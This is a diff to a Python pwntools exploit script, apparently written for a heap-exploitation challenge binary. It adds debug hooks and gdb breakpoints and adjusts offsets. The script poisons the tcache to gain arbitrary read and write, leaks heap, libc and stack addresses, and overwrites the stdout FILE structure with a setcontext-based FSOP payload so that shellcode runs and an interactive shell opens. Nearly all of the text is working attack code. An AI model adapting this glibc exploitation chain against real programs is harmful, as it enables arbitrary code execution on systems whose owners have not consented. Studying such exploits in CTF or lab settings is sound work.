@@ -35,7 +35,7 @@ def leak_tcache(r1, r2):
 	
 	return 0
 
-def controlled_allocations(r1, r2, addr, heap_base_addr):
+def controlled_allocations(r1, r2, addr, heap_base_addr, debug, p, s):
 	global idx
 	r1.clean()
 	r2.clean()
@@ -46,7 +46,8 @@ def controlled_allocations(r1, r2, addr, heap_base_addr):
 	print(f"addr: {hex(addr)}")
 	print(f"heap_base: {hex(heap_base_addr)}")  
 	print(f"XOR result: {hex(xor_result)}")
-
+	
+	
 	r1.sendline(f"malloc 0".encode()) # chunk B
 	r1.sendline(f"malloc {idx}".encode()) # chunk B
 	r1.sendline(f"free {idx}".encode()) # free B
@@ -72,15 +73,19 @@ def controlled_allocations(r1, r2, addr, heap_base_addr):
 		
 		if stored == addr_packed.split(b'\x00')[0]: # checks if A's stored address (next pointer) is exactly our injected address
 			break
-	
+
 	r1.sendline(f"malloc {idx}".encode()) # gets B (returned at injected address's location
+	#if debug:
+	#	gdb.attach(p, s)
+	#	print(f"{idx}")
+	#	r1.interactive()
 	r1.sendline(f"free 0".encode())
 	r1.clean()
 	idx += 1
 
-def arbitrary_read(r1, r2, addr, heap_base_addr):
+def arbitrary_read(r1, r2, addr, heap_base_addr, debug, p, s):
 	global idx
-	controlled_allocations(r1, r2, addr, heap_base_addr)
+	controlled_allocations(r1, r2, addr, heap_base_addr, debug, p, s)
 	
 	r1.sendline(f"printf {idx - 1}".encode())
 	
@@ -89,11 +94,18 @@ def arbitrary_read(r1, r2, addr, heap_base_addr):
 	leak = u64(output.ljust(8, b'\x00')) 
 	return leak
 
-def arbitrary_write(r1, r2, addr, heap_base_addr, content):
+def arbitrary_write(r1, r2, addr, heap_base_addr, content, debug, p, s):
 	global idx
-	controlled_allocations(r1, r2, addr, heap_base_addr)
+	controlled_allocations(r1, r2, addr, heap_base_addr, debug, p, s)
+	if debug:
+		gdb.attach(p, s)
+		pause()
+		r1.sendline(f"scanf {idx - 1}".encode())
+		r1.sendline(content)
+		r1.interactive()
 	r1.sendline(f"scanf {idx - 1}".encode())
 	r1.sendline(content)
+#	r1.interactive()
 	
 	
 	
@@ -103,6 +115,7 @@ def exploit(r1, r2, p):
 	b * $mybase + 0x1c43
 	b * $mybase + 0x020eb
 	b * $mybase + 0x02158
+	b * $mybase + 0x01e68
 	b * setcontext
 	b * _IO_wfile_overflow
 	b * _IO_2_1_stdout_
@@ -120,15 +133,15 @@ def exploit(r1, r2, p):
 		location1 = ( ( leak & ~0xff) << 12) + 0x8a0
 		print(hex(location1))
 		
-		libc_leak = arbitrary_read(r1, r2, location1, leak)
+		libc_leak = arbitrary_read(r1, r2, location1, leak, 0, p, s)
 				
 		print("libc leak leak: ", hex(libc_leak))
 		
 		location2 = libc_leak + 0x60	
-		leak3 = arbitrary_read(r1, r2, location2, leak) # pivot 
+		leak3 = arbitrary_read(r1, r2, location2, leak, 0, p, s) # pivot 
 		
 		location3 = leak3 - 0x100
-		stack_leak = arbitrary_read(r1, r2, location3, leak)
+		stack_leak = arbitrary_read(r1, r2, location3, leak, 0, p, s)
 		print("stack_leak: ", hex(stack_leak))
 	
 		
@@ -221,14 +234,15 @@ def exploit(r1, r2, p):
 		setcontext = libc_base + 0x539e0
 		important_pointer_1 = libc_base + 0x21ba70
 #		important_pointer_1 = ( ( leak & ~0xff) << 12) + 0xe30
-		important_pointer_1 = ( ( leak & ~0xff) << 12) + 0xc50
+		#important_pointer_1 = ( ( leak & ~0xff) << 12) + 0xf50
 		
 		contains_IO_wfile_overflow = libc_base + 0x2160d8
 		_IO_wfile_overflow = libc_base + 0x86390
 		_IO_2_1_stdout_ = libc_leak + 0xb00
 		#_IO_2_1_stdout_ = ( ( leak & ~0xff) << 12) + 0xd50
-		_IO_2_1_stdout_ = ( ( leak & ~0xff) << 12) + 0xb70
+		#_IO_2_1_stdout_ = ( ( leak & ~0xff) << 12) + 0x870 # 0x0b here, badchars!
 		
+		#fsop_payload = b'\x00' * 0x300
 		fsop_payload = b'\x00' * 0x78 # 0
 		fsop_payload += p64(setcontext) # 0x78
 		fsop_payload += p64(0) # 0x80
@@ -236,7 +250,7 @@ def exploit(r1, r2, p):
 		fsop_payload += b'\x00' * 0x10  
 		fsop_payload += p64(_IO_2_1_stdout_ + 0x10)  # _wide_data, offset 0xa0, 0x10 + 0x68 would be p64(setcontext)
 
-		#payload += b'\x00' * (0xe0 - 0xa8 - 8)  # Rest of struct
+
 
 		# setting up rsp
 
@@ -252,11 +266,16 @@ def exploit(r1, r2, p):
 		fsop_payload += b'\x41' * 0x10
 		fsop_payload += p64(_IO_2_1_stdout_+0x10) #0xd8 from fake file struct of _wide_data, which overlaps with the corrupted _IO_2_1_stdout_ file struct
 		
-		arbitrary_write(r1, r2, shellcode_addr, leak, payload)
+
+		print("Length of fsop payload = ", hex(len(fsop_payload)))
 		
-		arbitrary_write(r1, r2, _IO_2_1_stdout_, leak, fsop_payload)
+			
 		
-		gdb.attach(p, s)
+		arbitrary_write(r1, r2, shellcode_addr, leak, payload, 0, p, s)
+		
+		arbitrary_write(r1, r2, _IO_2_1_stdout_, leak, fsop_payload, 1, p, s)
+		
+		#gdb.attach(p, s)
 		r1.interactive()	
 		
 		
